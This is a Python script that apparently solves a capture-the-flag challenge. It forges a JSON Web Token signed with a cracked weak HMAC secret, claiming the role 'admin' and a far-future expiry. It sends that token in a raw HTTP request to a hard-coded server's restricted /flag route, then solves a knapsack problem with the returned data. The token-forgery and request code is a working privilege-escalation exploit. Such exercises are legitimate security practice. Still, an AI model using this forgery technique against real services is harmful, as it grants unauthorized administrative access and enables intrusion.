import socket
import json
import base64
import hmac
import hashlib

HOST = '98.94.69.132'
PORT = 32444
SEGREDO = 'bola'

def base64url_encode(dados_dict):
    """Codifica um dicionário no formato estrito Base64URL."""
    json_str = json.dumps(dados_dict, separators=(',', ':'))
    b64_bytes = base64.b64encode(json_str.encode('utf-8'))
    return b64_bytes.decode('utf-8').rstrip('=').replace('+', '-').replace('/', '_')

def forjar_jwt_valido():
    """Gera o token assinado legitimamente com a chave descoberta e expiração longa."""
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "username": "user",
        "role": "admin",
        "exp": 2000000000  # Data estendida para o ano de 2033 para evitar expiração
    }
    
    header_encoded = base64url_encode(header)
    payload_encoded = base64url_encode(payload)
    
    mensagem = f"{header_encoded}.{payload_encoded}".encode('utf-8')
    # CORREÇÃO: Alterado de 'message=' para 'msg='
    assinatura = hmac.new(SEGREDO.encode('utf-8'), msg=mensagem, digestmod=hashlib.sha256).digest()
    assinatura_encoded = base64.b64encode(assinatura).decode('utf-8').rstrip('=').replace('+', '-').replace('/', '_')
    
    return f"{header_encoded}.{payload_encoded}.{assinatura_encoded}"

def resolver_mochila(capacidade, pesos, valores):
    """Resolve o problema da mochila 0/1 usando Programação Dinâmica."""
    n = len(pesos)
    tabela = [[0 for _ in range(capacidade + 1)] for _ in range(n + 1)]
    
    for i in range(1, n + 1):
        for w in range(1, capacidade + 1):
            if pesos[i-1] <= w:
                tabela[i][w] = max(valores[i-1] + tabela[i-1][w-pesos[i-1]], tabela[i-1][w])
            else:
                tabela[i][w] = tabela[i-1][w]
    
    w = capacidade
    itens_escolhidos = []
    for i in range(n, 0, -1):
        if tabela[i][w] != tabela[i-1][w]:
            itens_escolhidos.append(i - 1)
            w -= pesos[i-1]
            
    return sorted(itens_escolhidos)

def extrair_dados_e_resolver():
    token = forjar_jwt_valido()
    print("[+] Token de Administrador gerado com expiração estendida (2033).")
    
    print("[*] Enviando requisição para a rota restrita /flag...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        
        requisicao = (
            "GET /flag HTTP/1.1\r\n"
            f"Host: {HOST}:{PORT}\r\n"
            f"Authorization: {token}\r\n"
            "Connection: close\r\n\r\n"
        )
        s.sendall(requisicao.encode('utf-8'))
        
        resposta = b""
        while True:
            dados = s.recv(4096)
            if not dados:
                break
            resposta += dados
            
        partes = resposta.decode('utf-8', errors='ignore').split('\r\n\r\n', 1)
        corpo = partes[1] if len(partes) > 1 else ""
        
        print("\n--- [ Retorno do Servidor ] ---")
        print(corpo.strip())
        
        try:
            dados_mochila = json.loads(corpo)
            if "capacidade" in dados_mochila:
                print("\n[+] Dados obtidos! Computando a solução ideal...")
                resultado = resolver_mochila(
                    dados_mochila["capacidade"], 
                    dados_mochila["pesos"], 
                    dados_mochila["valores"]
                )
                print(f"\n🎯 RESPOSTA DA FLAG (Lista de Índices): {resultado}")
        except json.JSONDecodeError:
            pass

if __name__ == "__main__":
    extrair_dados_e_resolver()